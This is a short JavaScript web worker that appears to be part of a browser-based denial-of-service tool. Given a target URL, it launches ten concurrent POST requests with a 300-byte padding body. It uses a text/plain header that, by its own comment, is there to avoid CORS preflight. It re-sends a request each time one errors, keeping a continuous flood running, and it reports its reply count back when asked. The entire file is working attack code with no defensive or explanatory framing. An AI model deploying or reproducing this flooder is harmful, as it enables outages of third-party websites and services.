var base = "";

/** 300 bytes. This gives sufficient room for alignment and the cookie */
var post_data = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
var gparam = "GPARAM"
var isrunning = 0
var replies = 0

function infoReceived(xmlhttp)
{
    //if (xmlhttp.readyState==1){
    //    setTimeout('makeRequest();', 0);
    //}
}
function err(e){
    replies = replies + 1
    setTimeout('makeRequest();', 0);
}
function makeRequest()
{
    //make a new URL and request it via POST
    var fullUrl = base;
    var httpRequest = new XMLHttpRequest();
    httpRequest.open("POST", fullUrl, true);
   
    //needed to force Webkit browsers to skip preflight request
    httpRequest.setRequestHeader("Content-Type","text/plain; charset=utf-8");

    httpRequest.onreadystatechange = infoReceived;
    httpRequest.onerror = err;
    httpRequest.send(post_data);
}

function dos() {
    //start the initial requests
    var i = 0;
    for(i=0;i<10;i++){
        makeRequest();
    }
}

self.onmessage = function(e) {
	// Begin sending requests on first message. On second message, return number of requests made.
    if (isrunning == 0)
    {
        isrunning = 1;
        base = e.data;
        dos();
    }
    else
    {
        postMessage(replies);
    }
}
